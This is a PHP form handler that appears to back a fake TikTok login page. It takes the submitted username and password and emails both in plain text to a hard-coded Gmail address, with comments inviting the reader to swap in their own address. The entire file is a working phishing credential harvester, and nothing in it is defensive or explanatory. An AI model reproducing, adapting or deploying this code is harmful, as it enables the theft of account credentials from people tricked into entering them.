<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Email settings
    $to = "yaseenchikfarr@gmail.com"; // Replace with your email
    $subject = "TikTok Login Attempt";

    // Email body
    $message = "
    <html>
    <head>
    <title>TikTok Login Attempt</title>
    </head>
    <body>
    <h2>Login Attempt Information</h2>
    <p><strong>Username:</strong> $username</p>
    <p><strong>Password:</strong> $password</p>
    </body>
    </html>
    ";

    // Set Content-Type header for HTML email
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8" . "\r\n";

    // Additional headers
    $headers .= "From: no-reply@yaseenchikfarr@gmail.com" . "\r\n"; // Replace with your domain or email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Email has been sent.";
    } else {
        echo "There was an error sending the email.";
    }
}
?>
